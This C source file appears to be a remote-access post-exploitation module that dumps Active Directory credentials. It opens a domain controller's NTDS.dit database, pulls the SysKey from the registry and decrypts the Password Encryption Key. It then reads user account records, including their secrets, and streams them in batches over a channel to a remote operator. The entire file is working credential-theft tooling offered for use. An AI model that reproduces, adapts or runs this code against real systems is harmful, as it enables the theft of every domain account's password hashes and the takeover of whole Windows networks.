#include "precomp.h"


typedef struct
{
	jetState *ntdsState;
	ntdsColumns *accountColumns;
	decryptedPEK *pekDecrypted;
	BOOL eof;
} NTDSContext;


DWORD ntds_parse(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	jetState *ntdsState = malloc(sizeof(jetState));
	PCHAR filePath = packet_get_tlv_value_string(packet, TLV_TYPE_NTDS_PATH);
	// Check if the File exists
	if (0xffffffff == GetFileAttributes(filePath)){
		res = 2;
		goto out;
	}
	strncpy(ntdsState->ntdsPath, filePath, 255);

	// Attempt to get the SysKey from the Registry
	unsigned char sysKey[17];
	if (!get_syskey(sysKey)){
		res = GetLastError();
		goto out;
	}


	// Create the structure for holding all of the Column Definitions we need
	ntdsColumns *accountColumns = malloc(sizeof(ntdsColumns));
	memset(accountColumns, 0, sizeof(ntdsColumns));

	JET_ERR startupStatus = engine_startup(ntdsState);
	if (startupStatus != JET_errSuccess){
		exit(startupStatus);
	}
	// Start a Session in the Jet Instance
	JET_ERR sessionStatus = JetBeginSession(ntdsState->jetEngine, &ntdsState->jetSession, NULL, NULL);
	if (sessionStatus != JET_errSuccess){
		JetTerm(ntdsState->jetEngine);
		res = sessionStatus;
		goto out;
	}
	JET_ERR openStatus = open_database(ntdsState);
	if (openStatus != JET_errSuccess){
		JetEndSession(ntdsState->jetSession, (JET_GRBIT)NULL);
		JetTerm(ntdsState->jetEngine);
		res = openStatus;
		goto out;
	}
	JET_ERR tableStatus = JetOpenTable(ntdsState->jetSession, ntdsState->jetDatabase, "datatable", NULL, 0, JET_bitTableReadOnly | JET_bitTableSequential, &ntdsState->jetTable);
	if (tableStatus != JET_errSuccess){
		engine_shutdown(ntdsState);
		res = tableStatus;
		goto out;
	}
	JET_ERR columnStatus = get_column_info(ntdsState, accountColumns);
	if (columnStatus != JET_errSuccess){
		engine_shutdown(ntdsState);
		res = columnStatus;
		goto out;
	}
	JET_ERR pekStatus;
	encryptedPEK *pekEncrypted = malloc(sizeof(encryptedPEK));
	decryptedPEK *pekDecrypted = malloc(sizeof(decryptedPEK));
	memset(pekEncrypted, 0, sizeof(encryptedPEK));
	memset(pekDecrypted, 0, sizeof(decryptedPEK));

	// Get and Decrypt the Password Encryption Key (PEK)
	pekStatus = get_PEK(ntdsState, accountColumns, pekEncrypted);
	if (pekStatus != JET_errSuccess){
		res = pekStatus;
		engine_shutdown(ntdsState);
		goto out;
	}
	if (!decrypt_PEK(sysKey, pekEncrypted, pekDecrypted)){
		res = GetLastError();
		engine_shutdown(ntdsState);
		goto out;
	}
	// Set our Cursor on the first User record
	JET_ERR cursorStatus = find_first(ntdsState);
	if (cursorStatus != JET_errSuccess){
		res = cursorStatus;
		engine_shutdown(ntdsState);
		goto out;
	}
	cursorStatus = next_user(ntdsState, accountColumns);
	if (cursorStatus != JET_errSuccess){
		res = cursorStatus;
		engine_shutdown(ntdsState);
		goto out;
	}

	// If we made it this far, it's time to set up our channel
	PoolChannelOps chops;
	Channel *newChannel;
	memset(&chops, 0, sizeof(chops));

	NTDSContext *ctx;
	// Allocate storage for the NTDS context
	if (!(ctx = calloc(1, sizeof(NTDSContext)))) {
		res = ERROR_NOT_ENOUGH_MEMORY;
		goto out;
	}

	ctx->accountColumns = accountColumns;
	ctx->ntdsState = ntdsState;
	ctx->pekDecrypted = pekDecrypted;
	ctx->eof = FALSE;

	// Initialize the pool operation handlers
	chops.native.context = ctx;
	chops.native.write = ntds_channel_write;
	chops.native.close = ntds_channel_close;
	chops.eof = ntds_channel_eof;
	chops.read = ntds_channel_read;
	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
	{
		res = ERROR_NOT_ENOUGH_MEMORY;
		goto out;
	}

	channel_set_type(newChannel, "ntds");
	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));

out:
	packet_transmit_response(res, remote, response);
	return res;
}

static DWORD ntds_channel_write(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten){
	return ERROR_SUCCESS;
}

static DWORD ntds_read_into_batch(NTDSContext *ctx, ntdsAccount *batchedAccount){
	DWORD result = ERROR_SUCCESS;
	JET_ERR readStatus = JET_errSuccess;
	ntdsAccount *userAccount = malloc(sizeof(ntdsAccount));
	memset(userAccount, 0, sizeof(ntdsAccount));
	readStatus = read_user(ctx->ntdsState, ctx->accountColumns, ctx->pekDecrypted, userAccount);
	if (readStatus != JET_errSuccess){
		result = readStatus;
	}
	else{
		memcpy(batchedAccount, userAccount, sizeof(ntdsAccount));
	}
	return result;
}

static DWORD ntds_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead){
	JET_ERR readStatus = JET_errSuccess;
	DWORD result = ERROR_SUCCESS;
	NTDSContext *ctx = (NTDSContext *)context;
	ntdsAccount batchedAccounts[20];
	memset(batchedAccounts, 0, sizeof(batchedAccounts));

	for (int i = 0; i < 20; i++){
		readStatus = ntds_read_into_batch(ctx, &batchedAccounts[i]);
		if (readStatus != JET_errSuccess){
			if (i == 0){
				result = readStatus;
			}
			else{
				ctx->eof = TRUE;
			}
			break;
		}
		next_user(ctx->ntdsState, ctx->accountColumns);
	}
	memcpy(buffer, batchedAccounts, bufferSize);
	*bytesRead = bufferSize;
	return result;
}

static DWORD ntds_channel_close(Channel *channel, Packet *request,
	LPVOID context){
	NTDSContext *ctx = (NTDSContext *)context;
	engine_shutdown(ctx->ntdsState);
	free(ctx->accountColumns);
	free(ctx->pekDecrypted);
	free(ctx);
	return ERROR_SUCCESS;
}

static DWORD ntds_channel_eof(Channel *channel, Packet *request,
	LPVOID context, LPBOOL isEof)
{
	NTDSContext *ctx = (NTDSContext *)context;
	*isEof = ctx->eof;
	return ERROR_SUCCESS;
}
